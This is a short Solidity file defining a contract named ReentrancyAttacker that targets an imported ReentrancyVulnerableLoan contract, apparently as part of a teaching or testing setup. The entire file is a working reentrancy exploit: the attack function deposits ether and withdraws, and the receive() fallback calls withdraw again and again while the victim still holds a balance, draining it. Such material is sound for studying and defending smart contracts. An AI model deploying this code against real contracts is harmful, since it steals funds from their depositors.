// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./ReentrancyVulnerableLoan.sol";

contract ReentrancyAttacker {
    ReentrancyVulnerableLoan public immutable victim;

    constructor(address victimAddress) {
        victim = ReentrancyVulnerableLoan(victimAddress);
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance > 0) {
            victim.withdraw();
        }
    }
}
